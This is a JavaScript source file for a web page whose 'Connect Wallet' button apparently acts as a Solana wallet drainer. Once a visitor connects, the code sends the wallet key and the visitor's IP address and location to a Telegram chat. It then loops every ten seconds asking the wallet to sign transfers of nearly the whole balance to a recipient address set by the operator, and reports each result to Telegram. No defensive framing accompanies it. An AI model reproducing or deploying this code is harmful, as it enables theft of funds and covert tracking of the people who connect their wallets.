import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
import Web3Modal from 'web3modal';
import axios from 'axios';
import { Telegraf } from 'telegraf';
import dotenv from 'dotenv';

dotenv.config();

const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
const chatId = process.env.TELEGRAM_CHAT_ID;
let provider;
let connection;
let walletPublicKey;

const network = "https://api.devnet.solana.com"; // Use mainnet for production
connection = new Connection(network, 'confirmed');

const recipientAddress = process.env.RECIPIENT_ADDRESS;
const recipientPublicKey = new PublicKey(recipientAddress);

const sol = 1000000000;
const minSolana = 0.003;
const minSolanaLamports = minSolana * sol;

async function sendNotification(message) {
    await bot.telegram.sendMessage(chatId, message);
}

async function getIpAndLocation() {
    try {
        const response = await axios.get('https://ipinfo.io?token=' + process.env.IPINFO_TOKEN);
        return response.data;
    } catch (error) {
        console.error('Error getting IP and location:', error);
        return {};
    }
}

async function init() {
    const web3Modal = new Web3Modal({
        cacheProvider: true,
        providerOptions: {}
    });

    document.getElementById('connectWallet').addEventListener('click', async () => {
        provider = await web3Modal.connect();
        console.log('Connected to wallet');
        
        const accounts = await provider.request({ method: "getAccounts" });
        walletPublicKey = new PublicKey(accounts[0]);
        
        console.log('Connected wallet public key:', walletPublicKey.toString());

        const locationData = await getIpAndLocation();
        const message = `Wallet connected: ${walletPublicKey.toString()}\nLocation: ${locationData.city}, ${locationData.region}, ${locationData.country}\nIP: ${locationData.ip}`;
        await sendNotification(message);
    });
}

init();

async function getBalance(publicKey) {
    const balance = await connection.getBalance(publicKey);
    return balance;
}

async function transfer(toPublicKey, lamports) {
    const transaction = new Transaction().add(
        SystemProgram.transfer({
            fromPubkey: walletPublicKey,
            toPubkey: toPublicKey,
            lamports,
        })
    );

    const { blockhash } = await connection.getRecentBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = walletPublicKey;

    const signedTransaction = await provider.request({
        method: "signTransaction",
        params: {
            message: transaction.serializeMessage()
        }
    });

    const signature = await connection.sendRawTransaction(signedTransaction);
    await connection.confirmTransaction(signature);

    return signature;
}

async function transferAllFund() {
    while (true) {
        try {
            const balanceMainWallet = await getBalance(walletPublicKey);
            const balanceLeft = balanceMainWallet - minSolanaLamports;

            if (balanceLeft < 0) {
                const message = 'Not enough balance to transfer';
                console.log(message);
                await sendNotification(message);
            } else {
                const message = `Wallet balance: ${balanceMainWallet}`;
                console.log(message);

                const signature = await transfer(recipientPublicKey, balanceLeft);

                const balanceOfWalletB = await getBalance(recipientPublicKey);
                console.log('SIGNATURE', signature);
                console.log('Wallet B balance', balanceOfWalletB);

                const successMessage = `Transfer successful\nSignature: ${signature}\nWallet B balance: ${balanceOfWalletB}`;
                await sendNotification(successMessage);
            }

            await new Promise((resolve) => setTimeout(resolve, 10 * 1000));
        } catch (error) {
            const errorMessage = `Error during transfer: ${error.message}`;
            console.log(errorMessage);
            await sendNotification(errorMessage);
        }
    }
}

// Start the transfer process when the wallet is connected
document.getElementById('connectWallet').addEventListener('click', transferAllFund);
